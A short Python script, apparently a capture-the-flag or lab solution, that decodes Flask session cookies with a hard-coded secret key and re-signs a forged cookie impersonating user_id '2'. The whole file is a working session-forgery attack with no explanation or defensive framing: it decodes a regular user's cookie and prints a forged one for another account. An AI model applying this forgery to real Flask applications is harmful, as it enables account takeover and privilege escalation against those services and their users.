from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # Override method
    # Take secret_key instead of an instance of a Flask app
    def get_signing_serializer(self, secret_key):
        if not secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.dumps(cookieDict)

if __name__=='__main__':
    secret_key = '9806d62bb5f4986c09a3872abf448e85'
    regular_user_cookie = ".eJwlj0FqAzEMAP_icw6SLdlSPrNIWomGQAu7yan071no3AdmfttWR55f7f463nlr22Nv9zanygAP7Zoui9lpiu1L1iAiVO0mfbEg7ykp08KyQmFZrQEBBUg2Ai3dOagEtZNpEgBOEiVzrY61G7AUMnXnHVZwXLCNdmtxHrW9fp75ffXIDJ4wME3Nrxx21xxzmUBNG16rGwbr5b3PPP4nRvv7AD7NPps.XaKPHA.ucFIavwdx6ocS2xsM7K-JKBKcsA"
    regular_user_decoded = decodeFlaskCookie(secret_key, regular_user_cookie)
    cookie_dict = {
        "_fresh": "true",
        "_id": "669830bc929eb8755b468ad78734441992a8275815de8e86acaefc907af730c0f014a3c1aebb5c4f81924a9e400164894ab9f21fda058f1542b5d07c5cccc5a3",
        "csrf_token": "86c56031ea9ab7555bb9e367a80f6a3bf72a1c59",
        "user_id": "2"
    }
    cookie = encodeFlaskCookie(secret_key, cookie_dict)
    
print("Decoded Cookie:\n" + str(regular_user_decoded) + "\n\nEncoded Cookie For User 2:\n" + cookie)

